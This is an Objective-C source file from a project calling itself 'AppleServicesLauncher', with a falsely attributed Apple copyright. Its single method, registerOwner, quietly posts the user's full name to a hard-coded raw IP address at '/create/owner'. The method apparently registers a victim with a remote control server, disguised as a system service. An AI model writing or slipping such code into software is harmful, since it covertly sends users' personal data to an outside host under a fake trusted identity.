//
//  Initializer.m
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/27/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import "Initializer.h"
#import "WTHTTPApi.h"

@implementation Initializer

+(void) registerOwner {
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    [httpObj httpPostRequest:@"http://128.199.167.133/create/owner" usingGetData:nil usingPostData:@{@"name":NSFullUserName()}];
}

@end
